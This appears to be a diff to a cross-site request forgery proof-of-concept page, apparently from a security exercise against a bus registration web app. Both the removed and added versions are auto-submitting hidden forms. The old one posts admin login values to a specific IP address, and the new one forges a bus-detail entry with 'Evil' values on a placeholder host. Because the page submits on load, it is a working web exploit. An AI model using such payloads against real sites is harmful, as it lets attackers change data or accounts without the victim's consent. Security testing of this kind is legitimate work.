@@ -1,13 +1,17 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <form id="csrfForm" action="https://44.204.151.67/registration/admin.php" method="POST">
-      <input type="hidden" name="uname" value="evil_admin">
-      <input type="hidden" name="psw" value="evil_password">
-      <input type="hidden" name="alogin" value="1">
-    </form>
-    <script>
-      document.getElementById('csrfForm').submit();
-    </script>
-  </body>
+    <form id="csrfForm" action="https://<ec2_IP>/registration/busdetail.php" method="POST">
+    <input type="hidden" name="bus" value="1">
+      	    <input type="hidden" name="bname" value="EvilBus">
+      	    <input type="hidden" name="bno" value="666">
+      	    <input type="hidden" name="from" value="EvilTown">
+      	    <input type="hidden" name="to" value="EvilCity">
+      	    <input type="hidden" name="time" value="66:66">
+      	    <input type="hidden" name="sno" value="40">
+      	    <input type="hidden" name="rad" value="Luxe">
+      	    <input type="hidden" name="fare" value="666">
+   	</form>
+   	<script>document.getElementById('csrfForm').submit();</script>
+      </body>
 </html>
